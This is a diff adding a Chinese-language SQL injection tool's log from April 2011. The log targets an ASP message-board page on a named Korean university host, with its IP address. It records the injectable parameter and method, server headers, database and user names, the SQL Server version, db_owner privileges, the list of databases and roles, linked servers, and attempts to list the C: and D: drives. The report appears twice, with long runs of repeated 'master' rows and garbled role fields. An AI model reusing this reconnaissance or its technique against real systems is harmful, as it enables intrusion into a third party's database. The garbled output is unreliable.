@@ -1,0 +1,251 @@
+■漏洞信息:============================================================
+ ·URL:http://cnfs.khu.ac.kr/app/designnjin_board/designnjin_board_write.asp?id=125&bmode=&mode=reply&board_id=12&no=181
+ ·页面标题：版锐措切背 积劝苞切措切 酒悼啊练切苞
+ ·参数:id=125&bmode=&mode=reply&board_id=12&no=181
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:222.122.213.158
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:44:31 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 05:43:31 GMT
+Set-Cookie: ASPSESSIONIDQSDCRDST=BDKHJCHAMAEFKNPFBHAAPKBH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：khucnfs
+- 用户名：khucnfs
+- 版本：Microsoft SQL Server 2005 - 9.00.4035.00 (Intel X86) 
+	Nov 24 2008 13:01:59 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Workgroup Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WWS-010
+- 服务名：MSSQLSERVER
+- 系统用户名：khucnfs
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+msdb		
+tempdb		
+model		
+msdb		
+AdventureWorks		
+ReportServerTempDB		
+AdventureWorksDW		
+AdventureWorks		
+cafe24		
+miaouwws010		
+yongsantgs		
+whywebx		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	WWS-010	3252	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WWS-010	SQL Server	SQLOLEDB	WWS-010		WWS-010	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of C:: 
+一次性获取失败，正在批次获取……
+
+■数据库信息:============================================================
+- 数据库名：khucnfs
+- 用户名：khucnfs
+- 版本：Microsoft SQL Server 2005 - 9.00.4035.00 (Intel X86) 
+	Nov 24 2008 13:01:59 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Workgroup Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WWS-010
+- 服务名：MSSQLSERVER
+- 系统用户名：khucnfs
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+msdb		
+tempdb		
+model		
+msdb		
+ReportServer		
+ReportServerTempDB		
+AdventureWorksDW		
+AdventureWorks		
+cafe24		
+miaouwws010		
+yongsantgs		
+whywebx		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	WWS-010	3252	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WWS-010	SQL Server	SQLOLEDB	WWS-010		WWS-010	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
